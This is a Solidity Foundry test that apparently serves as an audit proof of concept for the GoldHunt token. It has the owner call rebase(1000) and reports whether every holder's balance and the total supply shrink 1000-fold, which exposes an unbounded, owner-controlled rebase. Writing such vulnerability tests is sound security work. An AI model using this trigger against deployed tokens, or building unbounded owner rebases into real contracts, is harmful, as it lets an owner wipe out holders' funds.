// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/GoldHunt.sol";

contract MockLP {
    function sync() external {} // Minimized implementation
}

contract GoldHunt_RebaseTest is Test {
    GoldHunt public token;
    MockLP public mockLP;
    
    address owner = address(0x1001);
    address rewardsPool = address(0x2002);
    address alice = address(0x3003);

    function setUp() public {
        vm.prank(owner);
        token = new GoldHunt(); // Deploy contract with owner
        
        // Pre-set required contract configuration
        vm.prank(owner);
        token.setRewardsPool(rewardsPool);
        
        // Create mock LP pair
        mockLP = new MockLP();
        vm.prank(owner);
        token.setPair(address(mockLP));

        // Transfer tokens to Alice
        uint256 aliceTokens = 100 * 10**token.decimals();
        vm.prank(owner);
        token.transfer(alice, aliceTokens);
    }

    function testUnboundedRebase() public {
        // --- BEFORE-Trigger ---
        console.log("--- BEFORE-Trigger ---");
        uint256 aliceBalanceBefore = token.balanceOf(alice);
        uint256 rewardsPoolBalanceBefore = token.balanceOf(rewardsPool);
        uint256 totalSupplyBefore = token.totalSupply();
        
        assertTrue(aliceBalanceBefore > 0, "Alice should have tokens");
        console.log("Alice balance:", aliceBalanceBefore);
        console.log("Rewards pool balance:", rewardsPoolBalanceBefore);
        console.log("Total supply:", totalSupplyBefore);

        // --- Trigger ---
        console.log("--- Trigger Rebase ---");
        vm.startPrank(owner);
        token.rebase(1000); // 1000x multiplier
        vm.stopPrank();

        // --- AFTER-Trigger ---
        console.log("--- AFTER-Trigger ---");
        uint256 aliceBalanceAfter = token.balanceOf(alice);
        uint256 rewardsPoolBalanceAfter = token.balanceOf(rewardsPool);
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("Alice balance:", aliceBalanceAfter);
        console.log("Rewards pool balance:", rewardsPoolBalanceAfter);
        console.log("Total supply:", totalSupplyAfter);

        // --- Differential Comparison ---
        console.log("--- DIFFERENTIAL VERDICT ---");
        uint256 expectedAliceBalance = aliceBalanceBefore / 1000;
        uint256 expectedRewardsBalance = rewardsPoolBalanceBefore / 1000;
        uint256 expectedSupply = totalSupplyBefore / 1000;
        
        bool aliceReduced = (aliceBalanceAfter == expectedAliceBalance);
        bool rewardsReduced = (rewardsPoolBalanceAfter == expectedRewardsBalance);
        bool supplyReduced = (totalSupplyAfter == expectedSupply);
        
        console.log("Alice reduction: Expected %s, Actual %s", expectedAliceBalance, aliceBalanceAfter);
        console.log("Rewards reduction: Expected %s, Actual %s", expectedRewardsBalance, rewardsPoolBalanceAfter);
        console.log("Supply reduction: Expected %s, Actual %s", expectedSupply, totalSupplyAfter);
        
        if (aliceReduced && rewardsReduced && supplyReduced) {
            console.log("Vulnerability Exists: Unbounded rebase multiplier causes 1000x reduction of balances and total supply");
        } else {
            console.log("Vulnerability not Exist: Rebase operation bounded or contract fixed");
        }
    }
}